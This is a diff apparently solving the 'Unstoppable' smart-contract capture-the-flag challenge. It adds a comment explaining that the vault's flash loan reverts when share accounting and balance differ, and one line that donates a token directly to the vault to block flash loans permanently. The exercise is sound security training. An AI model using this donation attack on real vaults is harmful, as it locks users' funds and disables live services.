@@ -45,6 +45,13 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+         * We noticed that on UnstoppableVault::flashLoan, line 96 would revert if the vault balance does not match shares amount
+         * line 96: if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+         * We know that a donation would mess with the shares amount and that is how we will attack the vault.
+         * Player must send any positive amount of token to the vault by transfer, not deposit to stop the flashloan.
+         */
+        await token.connect(player).transfer(vault.address, 1n * 10n ** 18n);
     });
 
     after(async function () {
